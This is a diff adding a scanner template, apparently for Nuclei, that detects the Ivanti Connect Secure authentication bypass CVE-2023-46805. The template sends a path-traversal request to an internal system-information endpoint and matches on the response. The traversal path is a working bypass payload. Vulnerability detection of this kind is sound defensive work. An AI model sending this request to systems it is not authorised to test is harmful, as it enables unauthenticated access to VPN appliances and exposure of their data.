@@ -1,0 +1,25 @@
+id: ivanti-pulse-connect-secure-auth-bypass
+info:
+  name: Ivanti Pulse Connect Secure VPN Authentication Bypass (CVE-2023-46805)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve, authentication-bypass, vpn
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/totp/user-backup-code/../../system/system-information"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "build"
+          - "system-information"
+          - "software-inventory"
+      - type: word
+        part: header
+        words:
+          - "application/json"
